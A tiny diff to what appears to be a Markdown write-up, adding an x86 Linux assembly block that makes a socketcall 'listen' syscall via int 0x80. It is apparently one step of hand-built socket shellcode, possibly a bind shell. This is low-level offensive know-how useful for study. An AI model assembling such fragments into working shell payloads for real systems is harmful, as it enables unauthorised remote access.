@@ -67,3 +67,10 @@ push   0x2
 mov    ecx,esp
 int    0x80
 ```
+
+```assembly
+mov    DWORD PTR [ecx+0x4],edx
+mov    al,0x66
+mov    bl,0x4
+int    0x80
+```
